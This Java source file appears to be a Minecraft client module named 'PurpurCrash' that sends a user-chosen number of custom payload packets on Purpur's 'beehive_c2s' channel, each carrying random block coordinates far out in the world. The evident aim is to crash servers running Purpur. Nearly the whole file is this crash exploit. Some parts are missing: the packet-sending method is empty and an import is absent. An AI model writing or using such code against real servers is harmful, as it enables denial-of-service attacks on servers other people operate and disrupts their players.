import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import java.util.Random;

public class PurpurCrash {
    private String name;
    private String description;

    public PurpurCrash() {
        this.name = "purpur-crash";
        this.description = "CustomPayloadC2S packet sender";
    }

    public void build(LiteralArgumentBuilder<Object> builder) {
        builder.then(LiteralArgumentBuilder.literal("packets")
                .then(LiteralArgumentBuilder.argument("packets", IntegerArgumentType.integer(1))
                .executes(this::run)));
    }

    private int run(CommandContext<Object> ctx) {
        int packets = IntegerArgumentType.getInteger(ctx, "packets");
        System.out.printf("Sending %d packet(s)%n", packets);
        Random random = new Random();
        for (int i = 0; i < packets; ++i) {
            sendPacket(createCustomPayloadPacket(buf -> {
                long l = new BlockPos(random.nextInt(60000000) - 30000000, random.nextInt(5) + 250, random.nextInt(60000000) - 30000000).asLong();
                buf.writeLong(l);
            }, new Identifier("purpur", "beehive_c2s")));
        }
        return 1;
    }

    private void sendPacket(CustomPayloadC2SPacket packet) {
    }

    private CustomPayloadC2SPacket createCustomPayloadPacket(PacketConsumer consumer, Identifier id) {
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        consumer.accept(buf);
        return new CustomPayloadC2SPacket(id, buf);
    }

    @FunctionalInterface
    private interface PacketConsumer {
        void accept(PacketByteBuf buf);
    }
}
